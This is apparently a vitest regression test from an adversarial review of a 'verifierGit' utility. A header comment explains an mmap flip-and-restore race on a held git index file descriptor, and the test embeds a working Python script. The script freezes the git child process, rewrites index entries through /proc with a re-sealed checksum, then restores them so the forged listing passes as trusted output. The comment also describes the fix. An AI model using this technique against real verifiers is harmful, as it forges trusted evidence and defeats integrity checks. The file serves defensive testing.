/*
RFC-1616 round-34 independent adversarial probe — candidate commit
0245bf867, exported tree.

CX-r34-E — the generalization: EVERY index-consulting `verifierGit`
read runs the judged child on the claims fd (`GIT_INDEX_FILE=
/dev/fd/3`) inside an armed window (:5184-5202) whose claims
guards are `fsWatch("/proc/self/fd/<fd>")` + the `claimsFdPin`
settle byte+size compare (:3846-3858). The mmap(MAP_SHARED)
flip→restore primitive is invisible to both (zero inotify events;
restored bytes at settle) — so ANY read the claims index drives can
be fed a forged index inside the child's own lifetime. No
re-proof→spawn gap is needed: the flip lands strictly between the
re-proof's last byte and the child's open+read, exactly like
CX-r33-B but with a store the watch cannot see.

Demonstrated on `verifierGit(root, ["ls-files", "-s", "-z"])` —
a pure claims enumeration, fully attacker-shaped output:

  1. Attacker stages `x/evil.txt` into the real index BEFORE the
     consult (same-UID repo, `update-index --cacheinfo`) — preflight
     mint carries it into claims.names/claims.bytes legitimately.
  2. The hijacker freezes the `ls-files` child pre-read, mmap()s
     `/proc/<vpid>/fd/N` MAP_SHARED, rewrites `x/evil.txt`'s entry
     in place — `x/evil.txt` (10 chars) → `zzzzzzzzzz` (10 chars,
     a HEAD-committed file), oid → zzzzzzzzzz's HEAD blob, trailer
     re-sealed — ZERO inotify events, same size.
  3. The child emits the forged enumeration — `x/evil.txt` absent,
     `zzzzzzzzzz` duplicated. exitCode 0.
  4. On child exit the hijacker freezes the verifier, restores the
     original claims bytes through the same mapping; settle's
     claimsFdPin byte-compare attests the minted image; no event
     ever fired → the forged stdout returns as the trusted answer.

Honest outcomes: refused = exitCode -1 EVIDENCE-REFUSED; honest =
`x/evil.txt` present in the enumeration; forged = exitCode 0 with
`x/evil.txt` absent from the trusted `ls-files -s` output.

Fix: the held index is `fchmod`ed `0400` at mint — the attacker's
`open("/proc/<vpid>/fd/N", O_RDWR)` is EACCES, so no store primitive
(pwrite, ftruncate, mmap) ever reaches the inode. The owner's only
reopen — `chmodat` on the proc-fd path — bumps the inode's change
time, which the `ctimeNs` pin + the settle's `fsyncSync` readback
catch; the general channel also re-verifies the held fd after every
spawn before trusting its output.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { constants as fsConstants, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { verifierGit } from "../../../src/utils/verifier-git.ts";

(fsConstants as { O_TMPFILE?: number }).O_TMPFILE = 0o20200000;

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[], input?: string) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8", input }).trim();

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;

const startFlip = (vpid: number, decoyOidHex: string, secs = 60, logPath?: string) => {
  const script =
    "import os,sys,time,struct,hashlib,mmap\n" +
    "vpid=int(sys.argv[1]); mark=b'x/evil.txt'; repl=b'zzzzzzzzzz'; doid=bytes.fromhex(sys.argv[2]); end=time.time()+float(sys.argv[3]); log=open(sys.argv[4],'a')\n" +
    "me=str(os.getpid()); flipped=False; restored=False; orig=None; tm=None; t0=time.time()\n" +
    "def lg(m): log.write('%.1f %s\\n'%((time.time()-t0)*1000,m)); log.flush()\n" +
    "def kids():\n" +
    "    out=[]\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%vpid):\n" +
    "            try: out += open('/proc/%s/task/%s/children'%(vpid,t)).read().split()\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return out\n" +
    "def argv(k):\n" +
    "    try: return open('/proc/%s/cmdline'%k,'rb').read().split(b'\\0')\n" +
    "    except: return []\n" +
    "def rewrite(body):\n" +
    "    n=struct.unpack('>I',body[8:12])[0]; off=12\n" +
    "    for i in range(n):\n" +
    "        nlen=struct.unpack('>H',body[off+60:off+62])[0]&0xFFF\n" +
    "        name=body[off+62:off+62+nlen]\n" +
    "        if name==mark and len(repl)==nlen:\n" +
    "            b=bytearray(body)\n" +
    "            b[off+40:off+60]=doid\n" +
    "            b[off+62:off+62+nlen]=repl\n" +
    "            body=bytes(b)\n" +
    "            return body[:-20]+hashlib.sha1(body[:-20]).digest()\n" +
    "        off+=(62+nlen+8)//8*8\n" +
    "    return body\n" +
    "def findfd():\n" +
    "    try: names=os.listdir('/proc/%s/fd'%vpid)\n" +
    "    except: return None\n" +
    "    for n in names:\n" +
    "        try:\n" +
    "            if '(deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
    "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
    "        except: continue\n" +
    "        try:\n" +
    "            if os.pread(f,4,0)!=b'DIRC': os.close(f); continue\n" +
    "            sz=os.fstat(f).st_size\n" +
    "            if mark in os.pread(f,sz,0): return f\n" +
    "            os.close(f)\n" +
    "        except: continue\n" +
    "    return None\n" +
    "while time.time()<end and not restored:\n" +
    "    for k in kids():\n" +
    "        if k==me: continue\n" +
    "        av=argv(k)\n" +
    "        if b'ls-files' in av and b'-s' in av and b'--stage' not in av:\n" +
    "            try: os.kill(int(k),19)\n" +
    "            except: continue\n" +
    "            try: os.kill(vpid,19)\n" +
    "            except: pass\n" +
    "            f=findfd()\n" +
    "            if f is not None:\n" +
    "                try:\n" +
    "                    sz=os.fstat(f).st_size\n" +
    "                    m=mmap.mmap(f,sz)\n" +
    "                    orig=m[:]\n" +
    "                    img=rewrite(orig)\n" +
    "                    m[:]=img\n" +
    "                    tm=(f,m); flipped=True; lg('flipped child=%s sz=%d'%(k,sz))\n" +
    "                except Exception as e:\n" +
    "                    lg('fliperr %s'%e)\n" +
    "                    try: os.close(f)\n" +
    "                    except: pass\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: pass\n" +
    "            if flipped:\n" +
    "                for _ in range(120000):\n" +
    "                    try:\n" +
    "                        stt=open('/proc/%s/stat'%k).read().rsplit(')',1)[1].split()[0]\n" +
    "                        if stt=='Z': break\n" +
    "                    except: break\n" +
    "                    time.sleep(0.00005)\n" +
    "                try: os.kill(vpid,19)\n" +
    "                except: pass\n" +
    "                try:\n" +
    "                    tm[1][:]=orig\n" +
    "                    restored=True; lg('restored')\n" +
    "                except Exception as e: lg('restoreerr %s'%e)\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            else:\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            break\n" +
    "    time.sleep(0.00002)\n" +
    "lg('exit flipped=%s restored=%s'%(flipped,restored))\n";
  const child = spawn(
    "python3",
    ["-c", script, String(vpid), decoyOidHex, String(secs), logPath ?? "/tmp/cx34e-trace.txt"],
    { stdio: "ignore" },
  );
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

describe("CX-r34-E: claims-fd mmap flip→restore inside ANY verifierGit index read — `ls-files -s` answers a forged enumeration", () => {
  it(
    "forged claims index omits the staged marker from `ls-files -s` — exitCode 0 with attacker-shaped listing",
    { timeout: 300_000 },
    async (ctx) => {
      if (!HAS_PY) return ctx.skip();
      let forged = 0;
      let refused = 0;
      let honest = 0;
      let lastErr = "";
      for (let attempt = 0; attempt < 30; attempt++) {
        const root = mkdtempSync(path.join(os.tmpdir(), "cx34e-"));
        tmpdirs.push(root);
        execFileSync("git", ["init", "-q", "-b", "main", root]);
        git(root, ["config", "user.email", "t@t"]);
        git(root, ["config", "user.name", "t"]);
        writeFileSync(path.join(root, "f.txt"), "v1\n");
        writeFileSync(path.join(root, "zzzzzzzzzz"), "z\n");
        git(root, ["add", "f.txt", "zzzzzzzzzz"]);
        git(root, ["commit", "-qm", "c1"]);
        const foreign = git(root, ["hash-object", "-w", "--stdin"], "FORGED\n");
        git(root, ["update-index", "--add", "--cacheinfo", `100644,${foreign},x/evil.txt`]);
        const decoyOid = git(root, ["rev-parse", "HEAD:zzzzzzzzzz"]);
        const log = `/tmp/cx34e-trace-${attempt}.txt`;
        const hijack = startFlip(process.pid, decoyOid, 60, log);
        try {
          const r = await verifierGit(root, ["ls-files", "-s", "-z"]);
          if (r.exitCode === -1) {
            refused++;
            lastErr = r.stderr.slice(0, 160);
          } else if (r.exitCode === 0 && !r.stdout.includes("x/evil.txt")) {
            forged++;
          } else {
            honest++;
          }
        } catch (e) {
          lastErr = String(e).slice(0, 140);
          refused++;
        } finally {
          hijack.stop();
        }
      }
      console.log(
        `claims-fd mmap flip on verifierGit ls-files -s: forged=${forged} refused=${refused} honest=${honest} last=${lastErr}`,
      );
      expect(forged).toBe(0);
    },
  );
});
